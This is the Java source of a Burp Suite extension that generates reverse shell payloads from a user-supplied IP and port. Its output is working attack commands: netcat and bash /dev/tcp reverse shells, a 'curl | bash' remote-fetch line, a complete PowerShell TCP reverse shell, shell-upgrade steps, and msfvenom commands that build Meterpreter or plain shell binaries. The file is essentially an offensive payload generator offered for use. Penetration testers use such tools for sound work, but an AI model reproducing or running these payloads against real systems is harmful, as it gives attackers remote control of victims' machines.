package burp;


import javax.swing.*;
import java.awt.*;

public class BurpExtender implements IBurpExtender, ITab{
    private IBurpExtenderCallbacks callbacks;
    private JPanel myPanel;
    private JTextField ipField;
    private JTextField portField;
    private JTextArea resultArea;
    private  JComboBox<String> fileTypeComboBox;
    private JCheckBox checkBox;

    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
        this.callbacks = callbacks;

        callbacks.setExtensionName("Reverse Shell Payload Generator");
        callbacks.addSuiteTab(this);
    }


    @Override
    public String getTabCaption() {
        return "Reverse Shell Generator";
    }

    @Override
    public JComponent getUiComponent() {
        myPanel = new JPanel(new BorderLayout());
        JPanel optionsPanel = new JPanel(new FlowLayout());
        JPanel resultPanel = new JPanel(new BorderLayout());

        JLabel ipLabel = new JLabel("IP:");
        ipField = new JTextField(15);
        optionsPanel.add(ipLabel);
        optionsPanel.add(ipField);

        JLabel portLabel = new JLabel("Port: ");
        portField = new JTextField(5);
        optionsPanel.add(portLabel);
        optionsPanel.add(portField);

        JLabel payloadTypeLabel = new JLabel("Payload Type:");
        String[] fileTypes = {"exe","elf","exe-service","msi","dll"};
        fileTypeComboBox = new JComboBox<>(fileTypes);
        optionsPanel.add(payloadTypeLabel);
        optionsPanel.add(fileTypeComboBox);

        checkBox = new JCheckBox("Use Meterpreter");
        optionsPanel.add(checkBox);


        JButton generateButton = new JButton("Generate Payload");
        generateButton.addActionListener(e -> generatePayload());

        resultArea = new JTextArea(20, 50);
        resultArea.setEditable(false);
        resultPanel.add(new JScrollPane(resultArea));

        myPanel.add( optionsPanel, BorderLayout.NORTH);
        myPanel.add( resultPanel, BorderLayout.CENTER);

        myPanel.add(generateButton, BorderLayout.EAST);

        return myPanel;
    }

    public void generatePayload() {
        String ip = ipField.getText();
        String port = portField.getText();
        String fileType = (String) fileTypeComboBox.getSelectedItem();
        boolean useMeterpreter = checkBox.isSelected();

        String payload = "nc:\n" +
                "nc " + ip + " " + port + " -e /bin/bash\n" +
                "rm -f /tmp/f; mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc -l " + ip + " " + port +" > /tmp/f\n\n" +
                "bash:\n" +
                "bash -i >& /dev/tcp/"+ip+"/"+port+" 0>&1\n" +
                "sh -i >& /dev/tcp/"+ip+"/"+port+" 0>&1\n\n" +
                "curl:\n" +
                "curl <yourServerIP> | bash\n\n" +
                "upgrade to interactive shell:\n" +
                "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n" +
                "export TERM=xterm\n" +
                "control + Z, stty raw -echo; fg\n" +
                "reset(optional)\n\n" +
                "rlwrap nc -lvvp "+port + "\n\n" +
                "windows powershell reverse shell:\n" +
                "powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('"+ip+"','"+port+"');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\n\n" +
                "msf:\n";
        if(useMeterpreter) {
            if(fileType == "elf") {
                payload += "msfvenom -p linux/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f elf > shell.elf\n";
            } else {
                payload += "msfvenom -p windows/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f "+ fileType + "> shell\n";
            }
        } else {
            if(fileType == "elf") {
                payload += "msfvenom -p linux/shell_reverse_tcp LHOST="+ip+" LPORT="+port+" -f elf > shell.elf\n";
            } else {
                payload += "msfvenom -p windows/shell_reverse_tcp LHOST="+ip+" LPORT="+port+" -f "+fileType+" > shell\n";
            }
        }

        resultArea.setText(payload);
    }
}
